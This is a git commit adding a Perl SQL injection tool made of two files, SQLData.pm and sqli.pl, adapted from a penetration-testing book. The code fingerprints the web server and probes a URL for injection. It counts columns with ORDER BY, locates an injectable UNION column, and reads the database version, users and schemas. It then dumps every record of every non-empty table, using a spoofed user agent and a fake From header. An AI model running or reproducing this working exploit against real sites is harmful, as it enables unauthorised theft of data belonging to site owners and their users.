f6fa920faf41f7c4c4630721a2231b26793472d3
JcynthTingson <jcynth.tingson@gmail.com>
2021-05-17 12:47:49 +0800

    Add files via upload

---
+++ SQLData.pm
@@ -0,0 +1,164 @@
+package SQLData;
+
+# STOPPED AT ERROR-BASED SQLI
+
+use IO::Socket;
+use LWP::UserAgent;
+use LWP::Protocol::https;
+use List::Compare;
+use strict;
+
+use parent qw<Exporter>;
+
+our $ua = LWP::UserAgent->new;
+our $loopflag;
+$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
+$ua->from('admin@google.com');
+$ua->timeout(10);
+our @EXPORT_OK = qw<$ua $loopflag>;
+
+our @content;
+
+
+sub getWebServer{
+    my $url = shift;
+    my $port = shift;
+    $url =~ s/\/(.*)//;
+    my $buf;
+    my $sock = IO::Socket::INET->new(
+        PeerAddr => $url,
+        PeerPort => $port,
+        Proto => "tcp"
+    ) || die "Cannot connect to " . $url;
+    $sock->send("HEAD / HTTP/1.1\r\n");
+    $sock->send("\r\n");
+    $sock->send("\r\n");
+    $sock->recv($buf, 2048);
+    my @buf = split("\n", $buf);
+    foreach(@buf){
+        if(m/^Server:(.*)/i){
+            return "\aWeb Server Found: ", $1, "\n";
+        }
+    }    
+}
+
+sub fetchPage{
+    # fetchPage Subroutine 
+    # Will modify the page result content or make a request and store the page result to '@content'
+    my $url = shift;
+    my ($type, $inj) = @_;
+    if($url && $type eq "injectcol"){ #injectcol or InjectColumn This function will detect what column number is injectable
+        $url =~ s/'-VAR-'/concat('0x031337',$inj,'0x031337')/;
+    }elsif($url && $type eq "directinject"){ # Direct inject: concatenates Injection String into URL
+        $url .=$inj;
+    }elsif($type eq "checkvulnerable"){ # Check if target URL is vulnerable to SQLi
+       $url = $url ."%27";    
+    }elsif($type eq "directnoinject"){ # Same as Direct Inject but no argument passed to '$inj'
+        my $res = $ua->get($url);
+        #print $url . "\n";
+        if($res->is_success){
+            @content = split(/\015?\012/, $res->content);
+            return $_[0];
+        }
+    }else{
+        return 0; 
+    }
+    my $res = $ua->get("http://".$url);
+    #print $url . "\n";
+    if($res->is_success){
+        # if the request is successful, Directly pass the page result into '@content'. So we can parse it with regex and get our desired result
+        @content = split(/\015?\012/, $res->content);
+        return $_[0]; 
+    }   
+}
+
+sub parsePage{
+    # on fetchPage subroutne we can see that some of our request has been concated with '0x031337'
+    foreach(@content){
+        if($_ =~ /0x031337(.+)0x031337/){ # this is pretty much self explanatory
+            return $1;
+        }elsif($_ =~ m/sql/ig){
+            return "Positive SQLi Vulnerability";
+        }
+    }
+}
+
+sub colCount{    
+    # get the Column count
+    my($url,$col,$err) = @_;
+    my $totalCol = 0;
+    return if $col > 32; 
+    # sennd a request with injection string
+    fetchPage($url,"directinject", "%20ORDER%20BY%20".$col."--%20");
+    foreach(@content){
+        # checks content if contains a match
+        if(m/unknown.*column.*order/i){
+            $col-=1;
+            colCount($url,$col, 1); # if not contains do it again
+            $totalCol = $col; # if contains a match assign and return
+            return $col
+        }
+    }
+    if(!$err){
+        $col+=5; # column number not found yet? increment and try again
+        print "Col not found! restarting... $col | \n";
+        colCount($url,$col,0); 
+        return 1;
+    }
+    return $totalCol;
+}
+
+sub injColumn{
+    # this subroutine detects which column is injectable
+    my($url,$colCount) = @_;
+    my $union = "%20union%20select%20";
+    my @fields;
+    my $injCol;
+    my $injectString;
+    for(my $i=0;$i<$colCount;$i++){
+        my $field = "";
+        for(my $j=0;$j<$colCount;$j++){
+            if($j == $i){
+                $field .= "'-VAR-',";
+            }else{
+                $field .= "null,";
+            }
+        }
+        push(@fields, $field);
+    }
+    for(my $i=0;$i<$colCount;$i++){
+        $fields[$i] =~ s/,$//;
+        fetchPage($url,"directinject",$union.$fields[$i]."%20--%20");
+        
+        foreach(@content){
+            if(m/-VAR-/){  
+                $injectString = $url.$union.$fields[$i]."%20--%20";
+                $injCol = $i;
+                print "Found Injectable column: ", ++$i, "\n";
+                return $injCol."---".$injectString;
+            }
+        }
+    }
+   return $injCol."---".$injectString;
+}
+
+sub modifyInjectionString{
+	my($string, $colCount, $injectableCol) = @_;
+	my $injP;
+	my $concat_str;
+	for(my $i=0;$i<$colCount;$i++){
+		if($i == $injectableCol){ 
+			$concat_str .= "concat('0x031337',";
+			$concat_str .= $string;
+			$concat_str .= ",'0x031337'), ";
+			#$concat_str =~ s/,$//;
+			$injP .= $concat_str;
+		}else{
+			$injP.='null,';
+		}
+	}
+	$injP =~ s/,$//;
+	return $injP;
+}
+
+1;
---
+++ sqli.pl
@@ -0,0 +1,126 @@
+#!/usr/bin/perl
+
+# This perl script was based on the Book: 'Penetration Testing with Perl' By Douglas Berdeaux
+# I ripped off the code and modified it to make it somehow "automated"
+# I've been tired and didn't bother to finish it.
+# Limitations: Can't exploit string UNION-BASED SQLi, Blind-SQLi, EROR-BASED SQLi
+# Written by Jcynth Tingson <jcynth.tingson@gmail.com>.
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+use Cwd qw( abs_path );
+use File::Basename qw( dirname );
+use lib dirname(abs_path($0));
+
+use SQLData qw<$ua $loopflag>;
+my $url = shift;
+my $port = shift;
+
+print SQLData::getWebServer($url, $port);
+
+my $res = SQLData::parsePage(SQLData::fetchPage($url,"checkvulnerable",0));
+#loop flag to true!
+$loopflag = 1;
+if($res =~ /positive/i){
+    print "We have detected an SQLi vulnerability...\n";
+    print "Counting columns...\n";
+    my $colCount = SQLData::colCount($url,5,0);
+    print "Column count: " . $colCount, "\n";
+    my($injCol, $injString) = split("---", SQLData::injColumn($url,$colCount));
+
+    print "DB Version: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(@@version)'));
+    print "\n------\n";
+    print "Server FS: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(@@datadir)'));
+    print "\n------\n";
+    print "User: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(user())'));
+    print "\n------\n";
+    print "System User: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(system_user())'));
+    print "\n------\n";
+    print "Database: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(database())'));
+    print "\n------\n";
+    my @databases = split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", "(select group_concat(distinct table_schema SEPARATOR ',') from information_schema.tables)")));
+    foreach my $db(@databases){
+        next if $db =~ /phpmyadmin/;
+        print "Accessible DB: ", $db, "\n";
+        print "Accessible Table: ", $_, "\n" foreach(split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcol",
+        "(select group_concat(distinct table_name SEPARATOR ',') from information_schema.tables where table_schema = " . "'$db')"))));
+        print "[--------------]\n";
+    }
+    my $queryRecSTR = "(select "
+                ."-COL- from (select \@r:=\@r%2b1 as gid,-COL- from ("
+                ."select \@r:=0) r,-TBL- p) k where gid = -INT-)";
+    #my $inj = modifyInjectionString($var, 4, 2);
+    my $queryRec = " union select ".SQLData::modifyInjectionString($queryRecSTR, $colCount, $injCol)."--";
+    my $queryCountSTR = "(selec"
+    ."t count(*) from -TBL-)";
+    my $queryCount = " union select ".SQLData::modifyInjectionString($queryCountSTR, $colCount, $injCol)."--";
+    my $tableCountSTR = "(selec"
+    ."t count(table_name) from information_schema.tables "
+    ."where table_rows > 0)";
+    my $tableCount = " union select ".SQLData::modifyInjectionString($tableCountSTR, $colCount, $injCol)."--";
+    my $columnCountSTR = "(sele"
+    ."ct count(column_name) from information_schema.colum"
+    ."ns where table_name = '-TBL-')";
+    my $columnCount = " union select ". SQLData::modifyInjectionString($columnCountSTR, $colCount, $injCol) ."--";
+    my $tableNameSTR = "(select"
+    ." table_name from (select \@r:=\@r%2b1 as gid,table_"
+    ."name from (select \@r:=0) r,information_schema.tabl"
+    ."es p where table_rows > 0) k where gid = -INT-)";
+    my $tableName = " union select ". SQLData::modifyInjectionString($tableNameSTR, $colCount, $injCol) ."--";
+    my $columnNameSTR = "(selec"
+    ."t column_name from (select \@r:=\@r%2b1 as gid,colu"
+    ."mn_name from (select \@r:=0) r,information_schema.c"
+    ."olumns p where table_name = '-TBL-') k where gid = "
+    ."-INT-)";
+    my $columnName = " union select ". SQLData::modifyInjectionString($columnNameSTR, $colCount, $injCol) ."--";
+    my $host = "http://".$url;
+    #print $host . "\n";
+    my $totalTables = SQLData::parsePage(SQLData::fetchPage($host.$tableCount, "directnoinject", 0));
+
+    #print $totalTables . "\n";
+
+    my @tables;
+    my @metadata;
+
+    for(my $i=1;$i<=$totalTables;$i++){
+        (my $tableNameInt = $tableName) =~ s/-INT-/$i/;
+        push(@tables, SQLData::parsePage(SQLData::fetchPage($host.$tableNameInt,"directnoinject", 0)));
+    }
+    foreach my $tbl(@tables){
+        my $metaString = $tbl.",";
+        (my $url = $host.$columnCount) =~ s/-TBL-/$tbl/;
+        my $c = SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
+        for(my $i=1;$i<=$c;$i++){
+            ($url = $host.$columnName) =~ s/-INT-/$i/;
+            $url =~ s/-TBL-/$tbl/;
+            $metaString .= SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
+            $metaString .= "," unless($i == $c);
+        }
+        push(@metadata,$metaString);
+    }
+
+    print $_, "\n" foreach(@metadata);
+    foreach my $mdata(@metadata){
+        my $recCount = 0;
+        my @ms = split(",", $mdata);
+        my $tbl = shift @ms;
+        (my $recs = $queryCount) =~ s/-TBL-/$tbl/;
+        my $url = $host.$recs;
+        $recCount = SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
+        next if $recCount < 1; #skip tables that has no record count
+        print "Table: ", $tbl, " has record count of: ", $recCount, "\n";
+        $url = $host.$queryRec;
+        (my $tUrl = $url) =~ s/-TBL-/$tbl/;
+        for(my $i=1;$i<=$recCount;$i++){
+            (my $rTurl = $tUrl) =~ s/-INT-/$i/;
+            foreach my $col(@ms){
+                (my $cTUrl = $rTurl) =~ s/-COL-/$col/g;
+                print SQLData::parsePage(SQLData::fetchPage($cTUrl, "directnoinject", 0)), " ";
+                #print $cTUrl . "\n";exit;
+            }
+            print "\n";
+        }
+    }    
+}
+print "\n";
